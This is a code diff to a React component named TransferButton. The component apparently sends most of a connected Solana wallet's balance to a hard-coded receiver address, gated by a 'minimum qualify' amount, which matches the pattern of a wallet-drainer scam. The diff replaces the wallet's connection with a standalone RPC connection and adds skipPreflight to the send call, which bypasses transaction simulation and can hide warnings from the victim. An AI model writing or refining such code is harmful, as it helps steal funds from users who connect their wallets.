@@ -1,16 +1,16 @@
 // src/components/TransferButton.jsx
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
 import {
+  Connection,
   LAMPORTS_PER_SOL,
   SystemProgram,
   TransactionMessage,
   VersionedTransaction,
 } from '@solana/web3.js';
-import { MIN_QUALIFY_SOL, RECEIVER_WALLET, TRANSFER_FEE_BUFFER } from '../utils/constants';
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
-  const { connection } = useConnection();
   const { publicKey, sendTransaction, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
@@ -19,6 +19,12 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
+      // Create a standalone HTTP-only connection (no WebSocket)
+      const connection = new Connection(RPC_URL, {
+        commitment: 'confirmed',
+        wsEndpoint: false,
+      });
+
       const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
         connection.getBalance(publicKey, 'confirmed'),
         connection.getLatestBlockhash('confirmed'),
@@ -72,7 +78,9 @@ export default function TransferButton({ className = '' }) {
 
       const transaction = new VersionedTransaction(messageV0);
 
-      const signature = await sendTransaction(transaction, connection);
+      const signature = await sendTransaction(transaction, connection, {
+        skipPreflight: true,
+      });
 
       console.log('⏳ Transaction sent:', signature);
 
@@ -115,7 +123,7 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, connected, connection]);
+  }, [publicKey, sendTransaction, connected]);
 
   if (!publicKey) return null;
 
